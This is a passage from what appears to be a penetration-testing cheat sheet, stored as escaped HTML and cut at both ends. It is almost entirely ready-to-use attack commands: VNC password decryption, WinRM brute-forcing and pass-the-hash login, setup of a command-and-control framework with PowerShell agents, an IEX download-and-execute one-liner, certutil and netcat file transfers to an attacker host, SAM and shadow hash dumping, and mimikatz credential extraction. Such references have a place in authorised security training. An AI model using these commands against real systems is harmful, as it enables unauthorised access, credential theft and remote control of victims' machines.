class=\"language-\"\u003Emsfconsole\nirb\nfixedkey = \"\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\"\nrequire 'rex\u002Fproto\u002Frfb'\nRex::Proto::RFB::Cipher.decrypt [\"2151D3722874AD0C\"].pack('H*'), fixedkey\n\u002Fdev\u002Fnul\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"winrm---5985---5986\"\u003EWINRM - 5985 - 5986\u003C\u002Fh2\u003E\n\u003Ch3 id=\"brute-force-9\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecrackmapexec winrm \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -p \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"connecting\"\u003EConnecting\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eevil-winrm -i \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -p \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nevil-winrm -i \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -H \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EHASH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"cgi\"\u003ECGI\u003C\u002Fh2\u003E\n\u003Ch3 id=\"found-cgi-scripts\"\u003EFound CGI scripts\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Effuf -w \u002Fhome\u002Fliodeus\u002Fwordlist\u002FSecLists\u002FDiscovery\u002FWeb-Content\u002FCGI-XPlatform.fuzz.txt -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fccgi-bin\u002FFUZZ -t 50\nffuf -w \u002Fhome\u002Fliodeus\u002Fwordlist\u002FSecLists\u002FDiscovery\u002FWeb-Content\u002FCGIs.txt -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fccgi-bin\u002FFUZZ -t 50\nffuf -w \u002Fhome\u002Fliodeus\u002Fdirectory-list-lowercase-2.3-medium.txt -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fcgi-bin\u002FFUZZ -e .sh,.pl,.cgi -t 100\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EIf a script is found try \u003Ca onclick=\"document.location.hash='shellshock';\" href=\"javascript:;\"\u003ESHELLSHOCK\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\n\u003Chr\u003E\n\u003Ch2 id=\"command-and-control-framework\"\u003ECommand and control framework\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Download\ngit clone https:\u002F\u002Fgithub.com\u002Fmhaskar\u002FOctopus\u002Ftree\u002Fv1.2\n\n# Install requirements\npip install -r requirements.txt\n\n# Usage\n.\u002Foctopus.py\n\n# Listener (exemple)\nlisten_http \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EBIND_IP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EBIND_PORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EHOSTNAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EINTERVAL_IN_SECONDS\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ELISTENER_NAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nlisten_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1\n\n# Agent (exemple)\ngenerate_powershell \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ELISTENER_NAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\ngenerate_powershell listener_1\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"compiling-exploits\"\u003ECompiling exploits\u003C\u002Fh2\u003E\n\u003Ch3 id=\"for-linux\"\u003EFor linux\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# 64 bits\ngcc -o exploit exploit.c\n\n# 32 bits\ngcc -m32 -o exploit exploit.c\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"for-windows\"\u003EFor windows\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003ETo compile Win32 bit executables, execute i686-w64-mingw32-gcc -o \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE.exe\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE.c\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nTo compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE.exe\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE.c\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nTo Compiled .cpp source file, execute i586-mingw32msvc-g++ -o \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E.exe \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E.cpp\nTo compile python scripts, pyinstaller --onefile \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESCRIPT.py\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Compile windows .exe on Linux\ni586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"cross-compile\"\u003ECross compile\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Egcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"dictionary-generation\"\u003EDICTIONARY GENERATION\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecewl -m \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EWORDS_SIZE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E --with-numbers -w dictiFromWebsite \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -d \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDEPTH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecrunch 5 5 -f \u002Fusr\u002Fshare\u002Fcrunch\u002Fcharset.lst mixalpha-numeric-all -t Test@ -o passwords.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"file-transfer\"\u003EFILE TRANSFER\u003C\u002Fh2\u003E\n\u003Ch3 id=\"linux-1\"\u003ELinux\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# PYTHON\npython -m SimpleHTTPServer \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\npython2.7 -c \"from urllib import urlretrieve; urlretrieve('\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E', '\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDESTINATION_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E')\"\n\n# FTP\nsudo python3 -m pyftpdlib  -p 21 -w\n\n# SMB\nsudo smbserver.py -smb2support liodeus .\n\n# WGET\nwget \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -o \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EOUT_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# CURL\ncurl \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -o \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EOUT_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# NETCAT\nnc -lvp 1234 \u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EOUT_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \nnc \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 1234 &lt; \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIN_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \n\n# SCP\nscp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESOURCE_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDESTINATION_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"windows-1\"\u003EWindows\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# FTP \necho open \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 21 \u003E ftp.txt echo anonymous\u003E\u003E ftp.txt echo password\u003E\u003E ftp.txt echo binary\u003E\u003E ftp.txt echo GET \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003E\u003E ftp.txt echo bye\u003E\u003E ftp.txt\nftp -v -n -s:ftp.txt\n\n# SMB\ncopy \\\\\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\\\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPATH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\\\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E # Linux -\u003E Windows\ncopy \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EFILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \\\\\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\\\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPATH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\\ # Windows -\u003E Linux\n\n# Powershell\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E', '\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDESTINATION_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E')\npowershell.exe IEX (New-Object System.Net.WebClient).DownloadString('\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E')\npowershell \"wget \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\n\n# Python\npython.exe -c \"from urllib import urlretrieve; urlretrieve('\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E', '\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDESTINATION_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E')\"\n\n# CertUtil\ncertutil.exe -urlcache -split -f \"\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\"\n\n# NETCAT\nnc -lvp 1234 \u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EOUT_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \nnc \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 1234 &lt; \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIN_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# CURL\ncurl \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -o \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EOUT_FILE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"git\"\u003EGIT\u003C\u002Fh2\u003E\n\u003Ch3 id=\"download-git\"\u003EDownload .git\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emkdir \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDESTINATION_FOLDER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n.\u002Fgitdumper.sh \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EURL\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F.git\u002F \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDESTINATION_FOLDER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"extract-git-content\"\u003EExtract .git content\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emkdir \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EEXTRACT_FOLDER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n.\u002Fextractor.sh \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDESTINATION_FOLDER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EEXTRACT_FOLDER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"hashes\"\u003EHASHES\u003C\u002Fh2\u003E\n\u003Ch3 id=\"windows-2\"\u003EWindows\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ereg save HKLM\\SAM c:\\SAM\nreg save HKLM\\System c:\\System\n\nsamdump2 System SAM \u003E hashes\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"linux-2\"\u003ELinux\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eunshadow passwd shadow \u003E hashes\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"mimikatz\"\u003EMIMIKATZ\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eprivilege::debug\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esekurlsa::logonpasswords\nsekurlsa::tickets \u002Fexport\n\nkerberos::list 